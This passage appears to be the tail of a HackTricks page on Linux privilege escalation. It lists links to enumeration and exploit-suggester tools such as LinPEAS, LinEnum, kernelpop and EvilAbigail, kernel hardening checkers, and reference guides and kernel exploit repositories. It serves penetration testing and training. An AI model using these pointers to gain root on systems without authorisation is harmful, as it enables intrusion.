- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
